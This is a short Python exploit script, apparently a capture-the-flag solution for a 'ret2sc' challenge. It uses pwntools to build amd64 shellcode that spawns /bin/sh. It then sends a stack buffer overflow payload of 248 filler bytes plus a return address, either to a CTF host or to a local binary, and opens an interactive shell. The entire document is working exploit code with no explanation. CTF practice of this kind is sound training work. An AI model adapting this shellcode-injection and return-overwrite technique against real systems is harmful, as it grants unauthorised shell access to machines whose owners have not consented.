from pwnlib import shellcraft
from pwnlib.args import args
from pwn import connect, process, p64, asm

shellcode = shellcraft.amd64.linux.sh()
shellcode = asm(shellcode, arch='amd64', os='linux')
print len(shellcode)

payload = 'x'*248 + p64(0x601080)
if args['REMOTE']:
    p = connect('csie.ctf.tw', 10126)
else:
    p = process('./ret2sc-a6a74cce51b034b6570e5416a38973c195d1b414')
p.sendline(shellcode)
p.sendline(payload)
p.interactive()
